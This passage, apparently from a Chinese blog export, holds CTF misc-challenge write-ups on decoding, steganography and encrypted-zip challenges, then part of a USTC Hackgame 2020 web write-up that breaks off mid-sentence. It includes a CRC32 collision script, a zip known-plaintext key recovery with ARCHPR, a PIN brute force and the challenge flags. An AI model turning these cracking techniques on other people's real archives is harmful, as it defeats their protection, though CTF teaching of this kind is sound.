class=\"line\">JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5</span><br></pre></td></tr></table></figure>\n\n<p><strong>base32解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=</span><br></pre></td></tr></table></figure>\n\n<p><strong>base64解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d</span><br></pre></td></tr></table></figure>\n\n<p><strong>hex解码</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SlientEye\"><a href=\"#SlientEye\" class=\"headerlink\" title=\"SlientEye\"></a>SlientEye</h2><p>根据题目直接百度<strong>SlientEye</strong>，下载以后打开图片–&gt;decode：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130105145.png\"></p>\n<p>参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">&amp;#102;</span><span class=\"symbol\">&amp;#108;</span><span class=\"symbol\">&amp;#97;</span><span class=\"symbol\">&amp;#103;</span><span class=\"symbol\">&amp;#123;</span><span class=\"symbol\">&amp;#110;</span><span class=\"symbol\">&amp;#49;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#98;</span><span class=\"symbol\">&amp;#117;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#106;</span><span class=\"symbol\">&amp;#49;</span><span class=\"symbol\">&amp;#97;</span><span class=\"symbol\">&amp;#110;</span><span class=\"symbol\">&amp;#103;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#119;</span><span class=\"symbol\">&amp;#117;</span><span class=\"symbol\">&amp;#95;</span><span class=\"symbol\">&amp;#100;</span><span class=\"symbol\">&amp;#51;</span><span class=\"symbol\">&amp;#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>再去百度搜到一篇博客：<a href=\"https://www.cnblogs.com/philipding/p/10153094.html\">&amp;#x开头的是什么编码?</a>，<del>我点开一看，哦，原来是</del>entity code实体编码，<del>我啪的一下就</del>把flag.txt改为flag.html，<del>很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳</del>打开flag.html获得flag：<strong>flag{n1_bu_j1ang_wu_d3}</strong></p>\n<h2 id=\"编码之王\"><a href=\"#编码之王\" class=\"headerlink\" title=\"编码之王\"></a>编码之王</h2><p>下载文件打开后一堆社会主义核心价值观，前面提到的：<a href=\"http://ctf.ssleye.com/\">CTF在线工具</a>就有核心价值观编码，下面放密文，上面是解码内容。</p>\n<p>解出来以后看到第一句：<code>如是我闻:</code>，–&gt;<a href=\"http://www.keyfc.net/bbs/tools/tudoucode.aspx\">与佛论禅</a></p>\n<p>再解之后看第一句：<code>新佛曰：</code>。–&gt;<a href=\"http://hi.pcmoe.net/buddha.html\">新与佛论禅</a></p>\n<p>解完以后直接出了一堆由：<code>[、]、!、+、(、)</code>组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130110943.png\"></p>\n<h2 id=\"jpgsteg\"><a href=\"#jpgsteg\" class=\"headerlink\" title=\"jpgsteg\"></a>jpgsteg</h2><p>题目即是用到的工具，百度下载软件，使用jphide.exe打开图片<code>Tap code.jpg</code>，选择seek功能解密，密码为123456（我蒙的）：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111311.png\"></p>\n<p>成功解密后获得一个文档，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">... ....</span><br><span class=\"line\">.. ...</span><br><span class=\"line\">.. ...</span><br><span class=\"line\">. .</span><br><span class=\"line\">... ..</span><br><span class=\"line\">. .</span><br><span class=\"line\">..... .....</span><br><span class=\"line\">.. ....</span><br><span class=\"line\">... ...</span><br><span class=\"line\">.. ..</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的<code>.</code>分成两部分代表坐标</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111538.png\"></p>\n<p>解码得到：<code>ohhamazing</code> ，加上括号就是：<strong>flag{ohhamazing}</strong></p>\n<p>事后多看了一眼图片命名：<code>Tap code.jpg</code>。这用啥解密不就在脸上写着的<del>wosabi \\0/</del>。。。</p>\n<h2 id=\"Collision\"><a href=\"#Collision\" class=\"headerlink\" title=\"Collision\"></a>Collision</h2><p>打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201102424.png\"></p>\n<p>所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：<a href=\"https://blog.csdn.net/weixin_45396639/article/details/103393759\">crc32碰撞 ctf python</a>作者原创的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crc</span>(<span class=\"params\">_crc</span>):</span></span><br><span class=\"line\">    l = <span class=\"number\">1</span></span><br><span class=\"line\">    dic = string.printable</span><br><span class=\"line\">    _<span class=\"built_in\">input</span> = _crc</span><br><span class=\"line\">    _<span class=\"built_in\">input</span> = <span class=\"string\">&quot;0X&quot;</span> + _<span class=\"built_in\">input</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                    s = i + n + h + m</span><br><span class=\"line\">                    s = s.encode()</span><br><span class=\"line\">                    <span class=\"comment\"># print(str(binascii.crc32(s)), _input)</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">hex</span>(binascii.crc32(s)).upper() == _<span class=\"built_in\">input</span>.upper():</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(_crc, <span class=\"string\">&#x27;:&#x27;</span>, s.decode())</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(l)</span><br><span class=\"line\">                        sys.exit()  <span class=\"comment\">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class=\"line\">                    l = l + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crc32</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class=\"line\">    num = <span class=\"built_in\">int</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class=\"line\">    _thread = []</span><br><span class=\"line\">    _args = []</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;输入参数&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i+<span class=\"number\">1</span>, end=<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">        _args.append(<span class=\"built_in\">input</span>())</span><br><span class=\"line\">    <span class=\"comment\"># print(_args)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class=\"line\">        _thread.append(t) <span class=\"comment\">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class=\"line\">    <span class=\"comment\"># print(_thread)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        _thread[i].start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num):</span><br><span class=\"line\">        _thread[i].join()</span><br><span class=\"line\">    <span class=\"built_in\">input</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    crc32()</span><br></pre></td></tr></table></figure>\n\n<p>使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ff92876d</span><br><span class=\"line\">6c4a558b</span><br><span class=\"line\">77e8fd00</span><br><span class=\"line\">1e59a66e</span><br><span class=\"line\">d1f4eb9a</span><br></pre></td></tr></table></figure>\n\n<p>碰撞以后获得的明文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1on&#125;</span><br><span class=\"line\">32co</span><br><span class=\"line\">llis</span><br><span class=\"line\">flag</span><br><span class=\"line\">&#123;crc</span><br></pre></td></tr></table></figure>\n\n<p>根据flag的结构拼接一下：<strong>flag{crc32collis1on}</strong></p>\n<h2 id=\"kaomoji\"><a href=\"#kaomoji\" class=\"headerlink\" title=\"kaomoji\"></a>kaomoji</h2><p>题目的压缩包解压以后得到一个<strong>flag.zip</strong>压缩包和<strong>secret.txt</strong>，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用<strong>winrar</strong>压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201103227.png\"></p>\n<p>配合ARCHPR使用明文攻击，获得加密密钥： <strong>[b00df998 5bdbbde6 485fa1f8]</strong></p>\n<p>我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包<strong>flag_decrypted.zip</strong>，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}</p>\n<h2 id=\"ARCHPR\"><a href=\"#ARCHPR\" class=\"headerlink\" title=\"ARCHPR\"></a>ARCHPR</h2><p>题目根据提示：<strong>This file was encrypted by me with a four-digit password, try to crack it!</strong></p>\n<p>密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.</span><br><span class=\"line\"></span><br><span class=\"line\">key: .--. .- ... ... .-- --- .-. -..</span><br></pre></td></tr></table></figure>\n\n<p>提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：<code>password</code>，使用LSB（<a href=\"https://github.com/livz/cloacked-pixel\">项目地址</a>）脚本执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python lsb.py extract flag.png 1.txt password</span><br></pre></td></tr></table></figure>\n\n<p><strong>1.txt</strong>中就包含了解密以后的flag：<strong>flag{th1s_15_f1agggggg}</strong></p>\n<h2 id=\"outguess\"><a href=\"#outguess\" class=\"headerlink\" title=\"outguess\"></a>outguess</h2><p>​    看题目找工具，使用outguess参考<a href=\"https://blog.csdn.net/weixin_43877387/article/details/103123858\">隐写工具outguess 的下载安装及使用</a>，在kali中安装以后执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outguess -r flag.jpg hide.txt</span><br></pre></td></tr></table></figure>\n\n<p>获得hide.txt文件的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg!</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+</span><br></pre></td></tr></table></figure>\n\n<p>上面一段使用<strong>凯撒密码</strong>移动13位获得：<strong>Do you know AES? The key is s3cur1ty, go and crack it!</strong></p>\n<p>其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是<code>s3cur1ty</code>，获得flag：<strong>flag{y0u_ar3_awes0m3}</strong></p>\n<p>解密网站：<a href=\"https://tool.oschina.net/encrypt\">https://tool.oschina.net/encrypt</a></p>\n<h2 id=\"Whitespace\"><a href=\"#Whitespace\" class=\"headerlink\" title=\"Whitespace\"></a>Whitespace</h2><p>题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201104847.png\"></p>\n<p>这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。</p>\n<p>在<a href=\"https://vii5ard.github.io/whitespace\">whitespace</a>网站中粘贴密文点上面的<code>run</code>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105235.png\"></p>\n<p>解密获得：<strong>password is BlindWaterMark!</strong></p>\n<p>输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Do you see any difference between the two pictures?</span><br><span class=\"line\">Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">上传文档</span><br><span class=\"line\">你看这两幅画有什么不同吗？</span><br><span class=\"line\">了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。</span><br></pre></td></tr></table></figure>\n\n<p>根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了<strong>盲水印</strong>技术，使用盲水印解密图片，项目地址：<a href=\"https://github.com/chishaxie/BlindWaterMark%EF%BC%8C%E6%89%A7%E8%A1%8C%EF%BC%9A\">https://github.com/chishaxie/BlindWaterMark，执行：</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python bwn.py decode 2.png 1.png 3.png </span><br></pre></td></tr></table></figure>\n\n<p>获得解密图片：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105728.png\"></p>\n<p>图片中的内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">296969a5695</span><br><span class=\"line\">6696a6a9a69</span><br><span class=\"line\">5669595a566</span><br><span class=\"line\">965696666aa</span><br><span class=\"line\">69596a9666a</span><br><span class=\"line\">a6a6569955a</span><br><span class=\"line\">5a66aa69a56</span><br><span class=\"line\">9566a6a6aa6</span><br></pre></td></tr></table></figure>\n\n<p>就百度曼切斯特编码解码，找到一篇博客：<a href=\"https://blog.csdn.net/weixin_30416871/article/details/98566881\">一些CTF编码脚本</a>，在里面找到了这两段：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201105901.png\"></p>\n<p>心里一顿狂喜，因为都是<code>2965a</code>这个几个字符组成的，应该就是找对了。根据博客代码自行修改脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">s = &#x27;296969a56956696a6a9a695669595a566965696666aa69596a9666aa6a6569955a5a66aa69a569566a6a6aa6&#x27;  #这是前面图片里的内容</span><br><span class=\"line\"></span><br><span class=\"line\">s=bin(int(s,16))</span><br><span class=\"line\">r=&quot;&quot;</span><br><span class=\"line\">for i in range(len(s)/2):</span><br><span class=\"line\">    if s[i*2:i*2+2] == &#x27;10&#x27;:</span><br><span class=\"line\">        r += &#x27;1&#x27;</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        r += &#x27;0&#x27;</span><br><span class=\"line\">print hex(int(r,2))[2:-1].decode(&#x27;hex&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>执行脚本后获得flag：<strong>flag{ab1de_by_th3_law}</strong></p>\n<h2 id=\"Steghide\"><a href=\"#Steghide\" class=\"headerlink\" title=\"Steghide\"></a>Steghide</h2><p>题目即工具。参考博客<a href=\"https://www.jianshu.com/p/c3679f805a0c\">隐写工具Steghide</a>，在kali中安装Steghide后执行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">steghide.exe extract -sf trump.jpg</span><br></pre></td></tr></table></figure>\n\n<p>会提示<code>Enter passphrase:</code>直接回车表示空密码，获得flag.txt，打开以后里面都是由<code>¿ ¡ .</code>组成的密文，和<strong>Ook</strong>的另一种编码：<strong>short Ook</strong>类似也是只用<code>? ! .</code>组成，把叹号和问号全部替换反过来<code>¡---&gt;!  ¿---&gt;?</code>，替换之后在线解码：<a href=\"https://www.splitbrain.org/services/ook%EF%BC%8C%E8%8E%B7%E5%BE%97flag%EF%BC%9A**flag%7By0u_ar3_clev3r%7D\">https://www.splitbrain.org/services/ook，获得flag：**flag{y0u_ar3_clev3r}</a>**</p>\n<h2 id=\"SSTV\"><a href=\"#SSTV\" class=\"headerlink\" title=\"SSTV\"></a>SSTV</h2><p>题目既是工具。搜索SSTV百度百科：</p>\n<blockquote>\n<p>慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。</p>\n</blockquote>\n<p>了解到是一种无线电传递图片的方法，搜到的博客<a href=\"https://blog.csdn.net/zkf0100007/article/details/83387790\">慢扫描电视 SSTV</a>和B站的视频<a href=\"https://www.bilibili.com/video/BV1ea4y1J787\">慢扫描电视SSTV</a>，下载MMSSTV软件，把output.wav音频调制麦克风输出，我使用的方法是在声音设置里把立体声混音打开并且设为默认设备，然后电脑里播放的声音就会被录制到。等待图片绘制成功，获得flag：<strong>DMCTF{SSTV,yyds?}</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201201111538.png\"></p>\n<h2 id=\"SimpleQrcode\"><a href=\"#SimpleQrcode\" class=\"headerlink\" title=\"SimpleQrcode\"></a>SimpleQrcode</h2><p>​    下载题目是一个gif图片都是二维码，使用使用stegSovle中的Frame Browser功能，一帧一帧播放，一帧一扫，有几帧图片是少了二维码的上边，有一张是少了右边，可以参考第一张完整的图片，把上面截取拼接上去，扫码后17张图片对应的内容（根据代码行号）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DM</span><br><span class=\"line\">CT</span><br><span class=\"line\">F&#123;</span><br><span class=\"line\">Qr</span><br><span class=\"line\">Co</span><br><span class=\"line\">de</span><br><span class=\"line\">_1</span><br><span class=\"line\">s_</span><br><span class=\"line\">so</span><br><span class=\"line\">_i</span><br><span class=\"line\">nt</span><br><span class=\"line\">er</span><br><span class=\"line\">es</span><br><span class=\"line\">ti</span><br><span class=\"line\">ng</span><br><span class=\"line\">!!</span><br><span class=\"line\">!&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考下题目标题和flag格式，拼接后获得flag：<strong>DMCTF{QrCode_1s_so_interesting!!!}</strong></p>\n"},{"title":"Hackgame2020(一)","date":"2020-11-01T10:33:40.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120831.png","_content":"\n## 前言\n\n比赛地址：https://hack.lug.ustc.edu.cn/\n\n# web\n\n### 签到题\n\n​\t第一题是flag提取器，打开题目以后页面是一个提取器下面一个`进度条`和一个`提取`按钮。\n\n![BwJbJs.png](https://s1.ax1x.com/2020/11/01/BwJbJs.png)\n\n​\t随便拉了拉进度条发现初始是`0`末尾是`1.5`，然后中间的数值都是小数\n\n![BwYAQx.png](https://s1.ax1x.com/2020/11/01/BwYAQx.png)\n\n​\t我猜的题目可能是想让数值为`1`时能提取到flag。\n\n​\tF12查看源代码，定位到进度条的标签，查看属性\n\n![](https://s1.ax1x.com/2020/11/01/BwYoX6.png)\n\n​\t确实和猜测一样最大最小值分别是`0`、`1.5`，注意到`step`值为`0.00001`，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到`1`个flag，就把网页上的`step`值改为`1`。然后随便拖动一下进度条得到`1`，点击`提取`按钮，完工。\n\n![](https://s1.ax1x.com/2020/11/01/BwNVaD.png)\n\n\n\n### 2048\n\n​\t打开题目是一个`2048`的小游戏，第一个想法就是玩`2048`达到一定分数以后会获得flag（~~可恶这个比赛怎么知道最近我天天在玩2048的~~）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种~~逃课废物~~是不可能努力哒！\n\nF12开始翻网页资源\n\n![](https://s1.ax1x.com/2020/11/01/BwUONF.png)\n\n​\t还好上次~~摸鱼~~课题做了一个网页版的2048，略微能看懂一点点结构，第一个`animframe_polyfill`应该就是管动画效果的，`keynpard...`这个肯定是相应按键的，`local_storage_manager`应该是保存游戏的，`game_manager`感觉就是管理整个游戏的主要文件。\n\n​\t打开`game_manager`粗略的看了下变量，`score` 分数、`over、won、keepPlaying`游戏状态，想赢游戏肯定是和`score、won`有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。\n\n发现了\n\n![](https://s1.ax1x.com/2020/11/01/BwdGdK.png)\n\n\n\n​\t只有这里修改了`won`的状态，前面还有个`16384`这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（~~小声bb~~[截图为证](https://s1.ax1x.com/2020/11/01/BwUdte.jpg)），直接让`if`里面的语句为真就可以获胜，直接修改`if(1) self.won = true`，保存文件，按一个方向键让语句执行到，完工。\n\n![](https://s1.ax1x.com/2020/11/01/BwwpTK.png)\n\n# general\n\n### 猫咪问题++\n\n​\t秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解\n\n![](https://s1.ax1x.com/2020/11/01/BwLtDs.png)\n\n​\t题意思很明显的书考验同学的搜题技巧。那就开工。\n\n![](https://s1.ax1x.com/2020/11/01/BwLD8U.png)\n\n\n\n#### 第一题\n\n> 1. 以下编程语言、软件或组织对应标志是哺乳动物的有几个？\n>\n> Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.\n>\n> 提示：学术上一般认为龙不属于哺乳动物。\n\n​\t本人只认识几个，那就一个一个搜呗。我的模式是：百度`xxx标志`然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度`xxx是哺乳动物吗`，妥妥的~~胎儿~~教学。\n\n​\t一个比较有印象就是`FreeDOS`这个标志就离谱，什么玩意\n\n![](https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg)\n\n\n\n**参考答案 ：12** \n\n\n\n#### 第二题\n\n>2. 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？\n\n​\t卡了我好一会，没听过信鸽传输，贴上最后找到答案的[博客](https://blog.csdn.net/qq_31621387/article/details/77690642)，以及一篇信鸽传输的[历史发展](sohu.com/a/309403082_354973)，长见识了。\n\n**参考答案：256**\n\n\n\n#### 第三题\n\n>3. USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？\n>\n>   提示：活动记录会在哪里？\n\n​\t搜索`USTC Linux 用户协会`发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的[新闻版块](https://lug.ustc.edu.cn/news/)（百度搜出来的是旧站，里面有新站的网址）。题目中还写道`2019年9月21日自由软件日活动`，那么官网肯定有那天的新闻。\n\n​\t找到一篇当天的新闻[2019 